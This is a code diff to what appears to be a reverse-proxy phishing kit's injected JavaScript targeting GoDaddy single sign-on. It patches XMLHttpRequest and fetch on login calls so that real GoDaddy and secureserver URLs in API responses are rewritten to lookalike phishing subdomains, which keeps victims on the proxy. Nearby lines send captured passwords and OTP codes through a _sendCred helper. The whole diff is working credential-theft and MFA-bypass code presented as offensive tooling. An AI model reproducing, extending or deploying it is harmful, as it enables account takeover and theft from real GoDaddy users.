@@ -415,36 +415,19 @@ js_inject:
           }
         } catch(_e) {}
 
-        // ── Navigation intercept — keep victim on proxy ──────────────────────────
-        // GoDaddy's React SPA sets window.location.href = "https://sso.godaddy.com/login/tac/pass?..."
-        // after successful password verification. sub_filters only rewrite server 302 headers,
-        // NOT JS-initiated navigations. Intercept Location.prototype here to rewrite them.
-        try {
-          var _navPhishDomain = (function() {
-            var parts = window.location.hostname.split('.');
-            return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
-          })();
-          function _rewriteNavUrl(u) {
-            if (typeof u !== 'string') return u;
-            return u
-              .replace(/https:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _navPhishDomain)
-              .replace(/https:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _navPhishDomain)
-              .replace(/https:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _navPhishDomain);
-          }
-          var _locProto = Location.prototype;
-          var _origReplace = _locProto.replace;
-          _locProto.replace = function(url) { return _origReplace.call(this, _rewriteNavUrl(url)); };
-          var _origAssign = _locProto.assign;
-          _locProto.assign = function(url) { return _origAssign.call(this, _rewriteNavUrl(url)); };
-          var _hrefDesc = Object.getOwnPropertyDescriptor(_locProto, 'href');
-          if (_hrefDesc && _hrefDesc.set) {
-            Object.defineProperty(_locProto, 'href', {
-              get: _hrefDesc.get,
-              set: function(url) { _hrefDesc.set.call(this, _rewriteNavUrl(url)); },
-              configurable: true
-            });
-          }
-        } catch(_e) {}
+        // ── Proxy-domain rewriter ────────────────────────────────────────────────
+        // Computes the phish base domain from the current hostname so we can
+        // rewrite GoDaddy real-domain URLs in API responses before the SPA acts on them.
+        var _pd = (function() {
+          var parts = window.location.hostname.split('.');
+          return parts.length >= 2 ? parts.slice(-2).join('.') : window.location.hostname;
+        })();
+        function _rewriteGDUrls(text) {
+          return text
+            .replace(/https?:\/\/sso2\.secureserver\.net/g, 'https://sssn2.' + _pd)
+            .replace(/https?:\/\/sso\.secureserver\.net/g,  'https://sssn.'  + _pd)
+            .replace(/https?:\/\/sso\.godaddy\.com/g,       'https://ssso.'  + _pd);
+        }
 
         // Block new service worker registrations so they can't intercept requests.
         if ('serviceWorker' in navigator) {
@@ -531,6 +514,7 @@ js_inject:
         // ── Layer 2: XHR prototype patch ──────────────────────────────────────────
         var _oOpen = XMLHttpRequest.prototype.open;
         var _oSend = XMLHttpRequest.prototype.send;
+        var _xhrRespDesc = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, 'responseText');
         XMLHttpRequest.prototype.open = function(method, url) {
           this._xm = method; this._xu = url;
           return _oOpen.apply(this, arguments);
@@ -548,15 +532,26 @@ js_inject:
                 if (obj.factor && obj.value) _sendCred(obj.value, email || user || '');
               } catch(e) {}
             }
-            // Watch login + OTP API responses — non-2xx means failure → redirect
-            if (this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/pass/my/token') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1)) {
+            var isLoginXhr = this._xu && (this._xu.indexOf('/pass/login') !== -1 || this._xu.indexOf('/pass/my/token') !== -1 || this._xu.indexOf('/v1/login') !== -1 || this._xu.indexOf('/api/login') !== -1);
+            if (isLoginXhr) {
+              // Patch responseText to rewrite real GoDaddy URLs before the SPA reads them.
               var self = this;
+              if (_xhrRespDesc) {
+                Object.defineProperty(self, 'responseText', {
+                  get: function() {
+                    var raw = _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : '';
+                    return _rewriteGDUrls(raw);
+                  },
+                  configurable: true
+                });
+              }
               this.addEventListener('load', function() {
                 if (self.status >= 400 || self.status === 0) {
                   _doRedirect();
                 } else {
                   try {
-                    var r = JSON.parse(self.responseText);
+                    var raw = _xhrRespDesc && _xhrRespDesc.get ? _xhrRespDesc.get.call(self) : self.responseText;
+                    var r = JSON.parse(raw);
                     if (r && (r.error || r.success === false)) _doRedirect();
                   } catch(e) {}
                 }
@@ -585,12 +580,17 @@ js_inject:
           }
           var p = _oFetch.apply(this, arguments);
           if (isLogin) {
-            p.then(function(resp) {
-              if (!resp.ok) { _doRedirect(); return; }
-              resp.clone().text().then(function(text) {
-                try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) _doRedirect(); } catch(e) {}
+            // Return a patched response: rewrite any real GoDaddy URLs in the
+            // JSON body before the React SPA reads them and navigates away.
+            return p.then(function(resp) {
+              if (!resp.ok) { _doRedirect(); return resp; }
+              return resp.clone().text().then(function(text) {
+                try { var r = JSON.parse(text); if (r && (r.error || r.success === false)) { _doRedirect(); return resp; } } catch(e) {}
+                var out = _rewriteGDUrls(text);
+                if (out === text) return resp;
+                return new Response(out, {status: resp.status, statusText: resp.statusText, headers: resp.headers});
               });
-            }).catch(function() { _doRedirect(); });
+            }).catch(function() { _doRedirect(); return new Response('{}', {status: 200}); });
           }
           return p;
         };
